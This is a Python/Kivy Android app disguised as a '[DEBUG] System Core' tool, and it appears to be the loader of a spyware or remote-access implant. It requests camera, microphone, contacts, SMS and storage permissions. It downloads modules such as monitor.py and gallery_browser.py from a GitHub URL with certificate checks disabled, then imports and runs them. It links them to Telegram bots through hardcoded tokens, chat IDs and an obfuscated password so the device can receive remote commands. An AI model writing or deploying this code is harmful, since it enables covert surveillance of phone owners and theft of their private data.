# -*- coding: utf-8 -*-
import os, sys, threading, json, base64, importlib, requests, hashlib, traceback, gc, time
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

R = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(R):
    os.makedirs(R)
# إضافة المجلد إلى sys.path في البداية (أولوية قصوى)
if R not in sys.path:
    sys.path.insert(0, R)

def _request_perms():
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET, Permission.CAMERA, Permission.RECORD_AUDIO,
            Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_CONTACTS, Permission.READ_SMS, Permission.WAKE_LOCK,
            Permission.ACCESS_NETWORK_STATE, Permission.ACCESS_WIFI_STATE
        ])
    except:
        pass

def _get_static_key():
    return hashlib.sha256(b"Z@3n_Global_Controller_2026_Secure").digest()

def decrypt_data(blob):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        key = _get_static_key()
        data = base64.b64decode(blob)
        iv, tag, ct = data[:12], data[12:28], data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        dec = cipher.decryptor()
        return (dec.update(ct) + dec.finalize()).decode()
    except:
        return None

# الرابط المباشر الخام للملف index.json
RAW_INDEX_URL = "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"

class DebugApp(App):
    def build(self):
        _request_perms()
        self.title = "[DEBUG] System Core"
        layout = BoxLayout(orientation='vertical', spacing=5)

        self.log_view = TextInput(
            text="",
            readonly=True,
            background_color=(0.05,0.05,0.05,1),
            foreground_color=(0.2,1,0.2,1),
            font_size='11sp'
        )

        btn_layout = BoxLayout(size_hint=(1,0.1), spacing=10)
        copy_btn = Button(text="📋 Copy Log", background_color=(0.2,0.3,0.4,1))
        copy_btn.bind(on_press=self._copy_log)
        clear_btn = Button(text="🗑 Clear", background_color=(0.6,0.2,0.2,1))
        clear_btn.bind(on_press=self._clear_log)

        btn_layout.add_widget(copy_btn)
        btn_layout.add_widget(clear_btn)
        layout.add_widget(self.log_view)
        layout.add_widget(btn_layout)

        Clock.schedule_once(self._boot, 0.5)
        return layout

    def _copy_log(self, _):
        Clipboard.copy(self.log_view.text)
        self._log("Log copied to clipboard", "SYS")

    def _clear_log(self, _):
        self.log_view.text = "--- Log cleared ---\n"

    def _log(self, msg, level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        clean_msg = str(msg).replace('\x00', '')
        def _update(dt):
            self.log_view.text += f"[{ts}] [{level}] {clean_msg}\n"
            if len(self.log_view.text) > 15000:
                self.log_view.text = self.log_view.text[-8000:]
            self.log_view.cursor = (0, len(self.log_view.text))
        Clock.schedule_once(_update, 0)

    def _boot(self, _):
        threading.Thread(target=self._engine, daemon=True).start()

    def _engine(self):
        self._log("🚀 Core engine started (debug mode)", "BOOT")

        # معلومات الجهاز
        try:
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            self._log(f"Device: {Build.MANUFACTURER} {Build.MODEL} | Android {Build.VERSION.RELEASE} (API {Build.VERSION.SDK_INT})", "DEVICE")
        except:
            self._log("Device info: not available (non-Android or missing JNI)", "DEVICE")

        # فحص الإنترنت
        try:
            requests.get("https://google.com", timeout=5).raise_for_status()
            self._log("Internet: reachable", "NET")
        except:
            self._log("Internet: UNREACHABLE", "NET")

        needed = ["monitor.py", "telegram_ui.py", "commands.py", "gallery_browser.py"]

        # تحميل الملفات من الرابط الخام
        self._log(f"Downloading index from {RAW_INDEX_URL}...")
        try:
            r = requests.get(RAW_INDEX_URL, timeout=15, verify=False,
                             headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                data = r.json()
                files = data.get('files', [])
                for f_url in files:
                    name = f_url.split('/')[-1]
                    if name in needed:
                        self._log(f"Downloading {name}...")
                        # إضافة timestamp لتجنب الكاش
                        r2 = requests.get(f"{f_url}?v={int(time.time())}", timeout=20, verify=False)
                        if r2.status_code == 200:
                            path = os.path.join(R, name)
                            with open(path, 'w', encoding='utf-8') as fp:
                                fp.write(r2.text)
                            self._log(f"✅ {name} saved ({len(r2.text)} bytes)")
                            # عرض أول سطرين من الملف للتحقق (اختياري)
                            if name == "monitor.py":
                                with open(path, 'r') as f:
                                    first_lines = f.readlines()[:3]
                                self._log(f"monitor.py starts with: {first_lines[0].strip()}")
                        else:
                            self._log(f"❌ Failed {name} (HTTP {r2.status_code})", "ERROR")
            else:
                self._log(f"❌ Index fetch failed: HTTP {r.status_code}", "ERROR")
        except Exception as e:
            self._log(f"❗ Download error: {str(e)}", "ERROR")

        # IMPORTANT: حذف الوحدات القديمة من sys.modules لضمان إعادة التحميل
        modules_to_reload = ["monitor", "telegram_ui", "commands", "gallery_browser"]
        for mod in modules_to_reload:
            if mod in sys.modules:
                del sys.modules[mod]

        # استيراد الوحدات الجديدة
        try:
            import monitor
            import telegram_ui
            import commands
            import gallery_browser
            # إعادة تحميل إضافي للتأكد (إذا كان الاستيراد قد استخدم نسخة قديمة)
            importlib.reload(monitor)
            importlib.reload(telegram_ui)
            importlib.reload(commands)
            importlib.reload(gallery_browser)
            self._log("✅ All modules imported and reloaded successfully")
        except Exception as e:
            self._log(f"❌ Module import/reload failed: {str(e)}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")
            return

        # التأكد من وجود الكلاس M
        if not hasattr(monitor, 'M'):
            self._log("❌ CRITICAL: monitor.py does not contain class 'M'", "ERROR")
            return

        # تهيئة الكائنات
        try:
            self._log("Initializing Monitor...")
            mon = monitor.M()
            mon.bots = [
                "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
                "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
                "8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q",
                "8731591344:AAE2akQtyBPLNZbzhxkjxYDgQ4noiH_keYo",
                "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
                "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
            ]
            mon.ctrl = -1003365166986
            mon.vlt = -1003787520015
            mon.pw = "".join([chr(x) for x in [90,97,101,110,49,50,51,64,49,50,51,64,49,50,51]])
            self._log("✅ Monitor configured")

            self._log("Initializing Telegram UI...")
            ui = telegram_ui.T(mon)
            self._log("✅ Telegram UI ready")

            from commands import ex as cmd_ex
            mon.cb_h = lambda d, cid, cbq: cmd_ex(d, ui, mon, cid, cbq)
            self._log("✅ Command bridge connected")
        except Exception as e:
            self._log(f"❌ Initialization error: {str(e)}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")
            return

        # بدء الخدمات
        try:
            self._log("Starting Monitor thread...")
            mon.start()
            self._log("✅ Monitor running")
            self._log("Starting Telegram bridge...")
            ui.start()
            self._log("✅ Telegram bridge running")
            self._log("🎉 SYSTEM ONLINE – ready to receive commands", "SUCCESS")
        except Exception as e:
            self._log(f"❌ Service start failed: {str(e)}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")

if __name__ == '__main__':
    DebugApp().run()
